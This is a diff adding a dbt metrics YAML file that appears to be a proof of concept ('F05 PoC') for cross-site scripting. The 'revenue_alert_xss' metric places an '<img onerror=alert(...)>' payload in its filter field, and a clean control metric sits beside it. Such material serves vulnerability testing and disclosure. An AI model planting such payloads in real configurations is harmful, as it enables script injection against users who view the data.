@@ -1,0 +1,45 @@
+version: 2
+
+models:
+  - name: orders
+    description: F05 PoC orders model
+
+  - name: metricflow_time_spine
+    time_spine:
+      standard_granularity_column: date_day
+    columns:
+      - name: date_day
+        granularity: day
+
+semantic_models:
+  - name: orders_model
+    model: ref('orders')
+    defaults:
+      agg_time_dimension: order_date
+    entities:
+      - name: order_id
+        type: primary
+    measures:
+      - name: total_amount
+        agg: sum
+        expr: amount
+    dimensions:
+      - name: order_date
+        type: time
+        type_params:
+          time_granularity: day
+
+metrics:
+  - name: revenue_alert_xss
+    label: Revenue (alert PoC)
+    type: simple
+    type_params:
+      measure: total_amount
+    filter: "<img src=x onerror=alert(document.domain)>"
+
+  - name: revenue_clean
+    label: Revenue (control, no payload)
+    type: simple
+    type_params:
+      measure: total_amount
+    filter: "1 = 1"
